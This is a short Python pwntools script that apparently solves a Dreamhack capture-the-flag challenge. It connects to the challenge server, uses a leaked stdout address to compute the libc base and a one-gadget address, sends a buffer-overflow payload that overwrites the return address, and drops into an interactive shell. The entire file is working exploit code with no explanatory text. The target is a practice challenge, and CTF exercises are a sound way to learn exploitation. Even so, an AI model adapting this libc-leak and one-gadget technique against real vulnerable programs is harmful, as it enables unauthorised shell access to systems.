from pwn import *
p=remote("host1.dreamhack.games",10886)
libc=ELF("./libc.so.6")
stdout_offset=libc.symbols["_IO_2_1_stdout_"]
og_offset=0x45216
def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

p.recvuntil("stdout: ")
libcstdout=int(p.recvline()[:-1],16)
baseadr=libcstdout-stdout_offset
og=og_offset+baseadr

slog("STDOUT", libcstdout)
slog("base", baseadr)
slog("one gadget", og)

payload=b'A'*0x18+p64(0)+b'A'*0x8+p64(og)
p.sendafter("MSG: ",payload)
p.interactive()